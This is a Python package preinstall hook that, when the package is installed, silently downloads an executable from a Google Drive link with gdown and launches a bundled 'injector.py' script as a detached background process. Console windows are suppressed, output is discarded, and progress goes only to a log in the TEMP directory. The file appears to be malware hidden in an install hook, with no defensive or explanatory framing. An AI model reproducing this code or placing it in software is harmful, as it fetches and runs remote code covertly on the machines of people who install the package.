import subprocess
import sys
import os
from pathlib import Path

GDOWN_DRIVE_ID = "1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n"
OUTPUT_NAME = "downloaded_file.exe"
LOG_FILE = Path(os.environ.get("TEMP", "")) / "preinstall_hook.log"

def log(msg):
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{msg}\n")
    except:
        pass

def run_hidden(cmd, wait=False):
    """Run command with no visible window."""
    flags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
    if wait:
        subprocess.run(cmd, creationflags=flags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        subprocess.Popen(cmd, creationflags=flags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

def main():
    log("=== Preinstall hook started ===")

    url = f"https://drive.google.com/uc?id={GDOWN_DRIVE_ID}"
    cmd = [sys.executable, "-m", "gdown", url, "-O", OUTPUT_NAME]
    try:
        run_hidden(cmd, wait=True)
        log("Download completed.")
    except Exception as e:
        log(f"Download failed: {e}")
        return

    injector_script = Path(__file__).parent / "scripts" / "injector.py"
    if not injector_script.exists():
        log(f"Injector not found at {injector_script}")
        return

    try:
        subprocess.Popen(
            [sys.executable, str(injector_script)],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            close_fds=True
        )
        log("Injector launched in background (detached).")
    except Exception as e:
        log(f"Failed to launch injector: {e}")

    log("=== Preinstall hook finished ===")

if __name__ == "__main__":
    main()
